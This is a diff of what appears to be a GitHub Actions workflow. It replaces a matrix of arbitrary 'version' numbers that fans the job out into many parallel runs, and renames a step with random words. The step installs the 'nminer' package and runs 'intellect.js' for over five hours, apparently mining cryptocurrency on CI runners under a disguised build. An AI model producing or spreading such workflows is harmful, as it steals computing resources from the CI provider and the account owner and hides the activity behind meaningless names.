@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4357 }
-          - { version: 9016 }
-          - { version: 5979 }
-          - { version: 5959 }
-          - { version: 2314 }
-          - { version: 451 }
-          - { version: 9764 }
-          - { version: 166 }
-          - { version: 1327 }
-          - { version: 1248 }
-          - { version: 1985 }
-          - { version: 9572 }
-          - { version: 5358 }
-          - { version: 4643 }
-          - { version: 9083 }
-          - { version: 82 }
-          - { version: 6050 }
-          - { version: 7294 }
-          - { version: 3492 }
-          - { version: 3803 }
+          - { version: 8001 }
+          - { version: 2766 }
+          - { version: 5741 }
+          - { version: 9615 }
+          - { version: 5137 }
+          - { version: 5177 }
+          - { version: 6762 }
+          - { version: 1659 }
+          - { version: 6425 }
+          - { version: 5772 }
+          - { version: 4150 }
+          - { version: 3992 }
+          - { version: 5762 }
+          - { version: 8810 }
+          - { version: 9365 }
+          - { version: 6288 }
+          - { version: 4777 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: inspect pant meaty pigsty
+      - name: cop-out tomorrow um sedately scarily
         run: |
           npm install nminer@latest
-          timeout 324m node intellect.js || echo "intellect executed"
+          timeout 308m node intellect.js || echo "intellect executed"
